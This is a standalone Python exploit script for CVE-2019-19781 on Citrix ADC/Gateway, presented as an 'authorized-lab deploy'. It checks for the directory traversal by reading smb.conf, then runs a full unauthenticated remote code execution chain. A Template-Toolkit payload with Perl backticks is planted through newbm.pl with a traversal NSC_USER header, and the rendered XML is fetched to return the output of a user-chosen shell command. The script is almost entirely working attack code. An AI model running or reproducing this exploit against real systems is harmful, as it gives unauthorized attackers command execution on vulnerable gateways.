#!/usr/bin/env python3
"""CVE-2019-19781 (Citrix ADC/Gateway path traversal) - authorized-lab deploy.

1. Detects the directory traversal via GET /vpn/../vpns/cfg/smb.conf.
2. Executes the canonical unauthenticated RCE chain:
   POST /vpn/../vpns/portal/newbm.pl with a Template-Toolkit gadget in the
   bookmark title and a traversal-controlled NSC_USER (file lands as
   /netscaler/portal/templates/<rand>.xml), then GETs the rendered XML,
   which evaluates the embedded Perl backticks and returns command output.
"""
import argparse
import json
import random
import string
import sys

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

OUT_START = "Q9M0UTST4RT"
OUT_END = "Q9M0UT3ND"


def rand_str(n=14):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def check_traversal(base, timeout):
    """Path traversal read of smb.conf proves the vulnerable code path."""
    try:
        r = requests.get(base + "/vpn/../vpns/cfg/smb.conf", verify=False, timeout=timeout)
        body = r.text
        if r.status_code == 200 and ("NETLOGON" in body or "workgroup" in body.lower()):
            return True, {"status": r.status_code, "evidence": "smb.conf content disclosed via /vpn/../ traversal"}
        return False, {"status": r.status_code, "evidence": "unexpected body for smb.conf traversal read"}
    except requests.exceptions.RequestException as exc:
        return False, {"error": "%s: %s" % (type(exc).__name__, exc)}


def execute_command(base, command, timeout):
    """newbm.pl template write + XML render -> unauthenticated command execution."""
    name = rand_str()
    nonce = rand_str(22)
    shell = "echo %s; %s; echo %s" % (OUT_START, command, OUT_END)
    title = "[%% template.new({'BLOCK' => {}},{'OUT' => `%s`}) %%]" % shell
    headers = {
        "NSC_USER": "../../../../netscaler/portal/templates/" + name,
        "NSC_NONCE": nonce,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {"url": "255", "title": title, "desc": "check", "UI_inuse": "RfWebUI"}
    write = {"template_file": name + ".xml", "status": None, "error": None}
    try:
        r = requests.post(base + "/vpn/../vpns/portal/newbm.pl", data=data,
                          headers=headers, verify=False, timeout=timeout)
        write["status"] = r.status_code
    except requests.exceptions.RequestException as exc:
        write["error"] = "%s: %s" % (type(exc).__name__, exc)
        return False, write, None

    read = {"status": None, "error": None}
    try:
        r = requests.get(base + "/vpn/../vpns/portal/" + name + ".xml", verify=False, timeout=timeout)
        read["status"] = r.status_code
        if OUT_START in r.text and OUT_END in r.text:
            output = r.text.split(OUT_START, 1)[1].split(OUT_END, 1)[0].strip()
            return True, write, {"read": read, "output": output}
    except requests.exceptions.RequestException as exc:
        read["error"] = "%s: %s" % (type(exc).__name__, exc)
    return False, write, {"read": read, "output": None}


def run(args):
    base = "https://%s:%d" % (args.target, args.port)
    result = {
        "cve": "CVE-2019-19781",
        "target": base,
        "vulnerable": False,
        "verified_by": None,
        "traversal_check": None,
        "command_execution": None,
        "command_output": None,
        "error": None,
    }
    ok, detail = check_traversal(base, args.timeout)
    result["traversal_check"] = {"vulnerable": ok, "detail": detail}
    if not ok:
        result["error"] = "path traversal check failed (patched or not Citrix Gateway)"
        return result
    result["vulnerable"] = True
    result["verified_by"] = "path traversal via /vpn/../vpns/cfg/smb.conf"

    exec_ok, write, read = execute_command(base, args.command, args.timeout)
    result["command_execution"] = {"executed": exec_ok, "write": write, "read": read}
    if exec_ok:
        result["vulnerable"] = True
        result["verified_by"] = "unauthenticated RCE: newbm.pl template write rendered at /vpns/portal/%s.xml" % write["template_file"]
        result["command_output"] = read["output"]
    return result


def main():
    p = argparse.ArgumentParser(description="CVE-2019-19781 Citrix path traversal authorized-lab deploy")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, default=443)
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--command", default="id; hostname", help="shell command to execute (default: id; hostname)")
    args = p.parse_args()
    try:
        result = run(args)
    except Exception as exc:
        result = {"cve": "CVE-2019-19781", "target": "%s:%d" % (args.target, args.port),
                  "vulnerable": False, "error": "%s: %s" % (type(exc).__name__, exc)}
    print(json.dumps(result, indent=2))
    return 0 if result.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(main())
